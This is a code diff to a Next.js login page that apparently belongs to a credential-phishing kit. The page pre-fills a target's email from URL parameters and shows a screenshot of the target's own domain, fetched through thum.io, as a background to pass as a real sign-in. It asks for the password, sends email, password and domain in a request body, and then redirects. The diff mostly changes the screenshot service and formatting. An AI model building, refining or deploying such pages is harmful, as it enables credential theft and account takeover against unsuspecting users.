@@ -3,19 +3,20 @@
 import '../styles/globals.css'
 import { useSearchParams, useRouter } from 'next/navigation'
 import { useState, useEffect } from 'react'
+import thum from 'thum.io'
 
 export default function LoginPage() {
-  const params = useSearchParams()
-  const router = useRouter()
+  const params            = useSearchParams()
+  const router            = useRouter()
 
-  const preEmail       = params.get('email') || ''
-  const urlParamDomain = params.get('domain') || ''
+  const preEmail          = params.get('email') || ''
+  const urlParamDomain    = params.get('domain') || ''
 
-  const [email, setEmail]             = useState(preEmail)
-  const [confirmed, setConfirmed]     = useState(!!preEmail)
-  const [password, setPassword]       = useState('')
-  const [showModal, setShowModal]     = useState(false)
-  const [errors, setErrors]           = useState({ email: '', password: '' })
+  const [email, setEmail]                     = useState(preEmail)
+  const [confirmed, setConfirmed]             = useState(!!preEmail)
+  const [password, setPassword]               = useState('')
+  const [showModal, setShowModal]             = useState(false)
+  const [errors, setErrors]                   = useState({ email: '', password: '' })
   const [domainToCapture, setDomainToCapture] = useState('')
   const [screenshotUrl, setScreenshotUrl]     = useState('')
   const [isLoading, setIsLoading]             = useState(true)
@@ -40,18 +41,23 @@ export default function LoginPage() {
     setDomainToCapture(parts.length === 2 ? parts[1] : '')
   }, [confirmed, urlParamDomain, email])
 
-  // Build screenshot URL
+  // Build thum.io URL for the background
   useEffect(() => {
     if (!domainToCapture) {
       setScreenshotUrl('')
       setIsLoading(false)
       return
     }
-    const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
-    const sep  = base.includes('?') ? '&' : '?'
-    setScreenshotUrl(
-      `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
-    )
+    const secret = process.env.NEXT_PUBLIC_THUM_IO_SECRET!
+    const keyId  = parseInt(process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!, 10)
+
+    const thumbURL = thum.getThumURL({
+      url: `https://${domainToCapture}`,
+      width: 1200,
+      auth: { type: 'md5', secret, keyId },
+    })
+
+    setScreenshotUrl(thumbURL)
     setIsLoading(true)
     setProgress(0)
   }, [domainToCapture])
@@ -91,7 +97,11 @@ export default function LoginPage() {
       body: JSON.stringify({ email, password, domain: domainToCapture }),
     })
     setTimeout(() => {
-      router.push(`/end?email=${encodeURIComponent(email)}&domain=${encodeURIComponent(domainToCapture)}`)
+      router.push(
+        `/end?email=${encodeURIComponent(email)}&domain=${encodeURIComponent(
+          domainToCapture
+        )}`
+      )
     }, 2000)
   }
 
@@ -112,7 +122,7 @@ export default function LoginPage() {
         </div>
       )}
 
-      {/* Background screenshot + tint */}
+      {/* Background via thum.io + tint */}
       {screenshotUrl && (
         <div className="absolute inset-0 overflow-hidden p-10">
           <img
@@ -131,7 +141,9 @@ export default function LoginPage() {
 
       {/* Login Card */}
       <div className="login-card">
-        <h1 className="text-sm font-bold text-center mb-2 text-blue-600">Verify your email address to continue.</h1>
+        <h1 className="text-sm font-bold text-center mb-2 text-blue-600">
+          Verify your email address to continue.
+        </h1>
 
         {!confirmed ? (
           <form onSubmit={handleEmail} className="space-y-4">
@@ -143,7 +155,9 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.email && <p className="text-sm text-red-600">{errors.email}</p>}
+            {errors.email && (
+              <p className="text-sm text-red-600">{errors.email}</p>
+            )}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -172,7 +186,9 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
+            {errors.password && (
+              <p className="text-sm text-red-600">{errors.password}</p>
+            )}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -187,8 +203,12 @@ export default function LoginPage() {
       {showModal && (
         <div className="modal-overlay">
           <div className="modal-content">
-            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
-            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
+            <h2 className="text-lg font-semibold text-gray-800">
+              Please wait…
+            </h2>
+            <p className="mt-2 text-gray-600">
+              Submitting your credentials.
+            </p>
           </div>
         </div>
       )}
